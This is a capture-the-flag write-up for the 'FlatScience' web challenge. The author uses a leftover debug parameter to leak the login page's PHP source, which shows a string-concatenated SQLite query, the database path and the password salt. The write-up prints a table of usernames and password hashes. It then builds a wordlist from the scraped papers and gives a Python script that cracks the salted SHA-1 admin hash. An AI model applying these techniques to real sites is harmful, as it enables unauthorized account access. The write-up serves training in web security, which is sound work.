# FlatScience

```The Professor on Flat Earth is Prof. Flux Horst. Only for bragging he made his own Blog showcasing his favorite Papers. Beeing the only Professor, he thinks he is the smartest Person arround the Plate. Can you proof him wrong and log into his Admin-Panel?```

OK, let's see...
robots.txt:
```
User-agent: *
Disallow: /login.php
Disallow: /admin.php
```

Let's look at login.php, always a good place to start...
"*Login Page, do not try to hax here plox!*"
OK, that's just encouraging us, now for the page source.
"*<!-- TODO: Remove ?debug-Parameter! -->*"
Smart... yeah right....

One ?debug in the URL and we have the PHP source, more importantly we have:
1. `$db = new SQLite3('../fancy.db');`
2. `$res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");`

OK, so we have the database location, and the salt used to hash the password.

When I was doing this on the first day, the database was freely downloadable, I haven't been able to get it again since.. maybe a bug?
Anyway, I have the database!

| id | name | password | hint |
|:---:|:---:|:---:|:---:|
| 1 | admin | 3fab54a50e770d830c0416df817567662a9dc85c | my fav word in my fav paper?! |
| 2 | fritze | 2f72d9dd0f9d6ef605f402c91f517ea4 | my love is...? |
| 3 | hansi | 9e895c06352f4513fe179bf92b498397 | the password is password |

OK, in his papers.. but there are quite a few, all of them his favorite..
wget -r flatscience.flatearth.fluxfingers.net it is.
sooo find tells us we have 26 pdf files.. pdf files are well and nice, but txt files are easier:
```sh
find -name *.pdf -exec pdftotext {} \;
mkdir txts
find -name *.txt -exec cp {} txts \;
for i in `ls`; do tr -c '[:alnum:]' '[\n*]' < $i | sort | uniq ; done > wordlist
```

ahhh, don't you just love pipes :)
sha1 with salt over a word list, maybe the next part should be python:

```python
import hashlib
from tqdm import tqdm

with open('wordlist') as words:
    __values__ = words.readlines()
    for word in tqdm(__values__):
        word = word[:-1]
        hash_object = hashlib.sha1(b""+word+"Salz!")
        hex_dig = hash_object.hexdigest()
        if "3fab54a50e770d830c0416df817567662a9dc85c" in hex_dig:
            print word
```

OOOOh, look! a FLAG
